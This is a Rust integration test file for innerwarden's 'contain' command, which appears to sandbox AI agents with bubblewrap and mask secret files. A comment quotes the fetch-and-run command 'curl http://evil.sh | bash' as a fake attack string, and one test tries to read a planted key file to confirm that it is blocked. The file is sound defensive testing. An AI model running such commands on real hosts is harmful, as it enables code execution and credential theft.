use std::process::Command;

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_innerwarden")
}

/// A scratch record for the whole test binary.
///
/// Every CLI invocation here must write its narrative somewhere disposable.
/// Without this the suite recorded into the DEVELOPER'S OWN graph at
/// `~/.config/innerwarden/graph.json`: running `cargo test` injected fake attack
/// commands like `curl http://evil.sh | bash` into a real person's record and
/// pruned real history out of it. Found on 2026-08-05 while proving an unrelated
/// recording fix, when the graph under test changed size on its own.
fn scratch_graph() -> &'static std::path::Path {
    static DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
    static PATH: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
    PATH.get_or_init(|| {
        DIR.get_or_init(|| tempfile::TempDir::new().expect("scratch dir"))
            .path()
            .join("graph.json")
    })
}

/// The CLI under test, pointed at a disposable record by default. A test that
/// asserts on the record sets `IW_GRAPH_FILE` again; the later value wins.
fn cli() -> Command {
    let mut command = Command::new(bin());
    command.env("IW_GRAPH_FILE", scratch_graph());
    command
}

#[cfg(any(target_os = "linux", target_os = "macos"))]
#[test]
fn unsafe_project_is_rejected_before_the_host_hook_is_mutated() {
    let home = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--project",
            home.path().to_str().unwrap(),
            "--",
            "/bin/true",
        ])
        .env("HOME", home.path())
        .output()
        .expect("run contain with unsafe project");

    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("unsafe project path"));
    assert!(
        !home.path().join(".claude/settings.json").exists(),
        "validation must happen before hook installation mutates the host"
    );
}

#[cfg(target_os = "linux")]
#[test]
fn linux_backend_masks_innerwarden_secrets_and_keeps_project_available() {
    let backend_available = ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .any(|path| std::path::Path::new(path).is_file());
    assert!(
        backend_available,
        "CJC-090-AT-007 requires a real trusted bubblewrap binary on Linux; install bwrap on the journey runner instead of silently skipping isolation"
    );
    let home = tempfile::TempDir::new().unwrap();
    let project = tempfile::TempDir::new().unwrap();
    std::fs::create_dir_all(home.path().join(".claude")).unwrap();
    std::fs::write(home.path().join(".claude/history.jsonl"), "{}\n").unwrap();
    let secret = home.path().join(".config/innerwarden/llm-key");
    std::fs::create_dir_all(secret.parent().unwrap()).unwrap();
    std::fs::write(&secret, "CJC-J007-SECRET").unwrap();
    let allowed = project.path().join("allowed.txt");
    std::fs::write(&allowed, "CJC-J007-PROJECT-OK").unwrap();

    let script = format!(
        "if cat '{}' 2>/dev/null; then exit 70; fi; cat '{}'",
        secret.display(),
        allowed.display()
    );
    let output = cli()
        .args([
            "contain",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", home.path())
        .output()
        .expect("run Linux AI Jail");

    assert!(
        output.status.success(),
        "AI Jail failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(String::from_utf8_lossy(&output.stdout).contains("CJC-J007-PROJECT-OK"));
    assert!(!String::from_utf8_lossy(&output.stdout).contains("CJC-J007-SECRET"));
}

#[cfg(not(any(target_os = "linux", target_os = "macos")))]
#[test]
fn unsupported_platform_fails_without_claiming_a_jail() {
    let home = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args(["contain", "--", "echo", "ok"])
        .env("HOME", home.path())
        .output()
        .expect("run contain");
    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("not supported"));
}
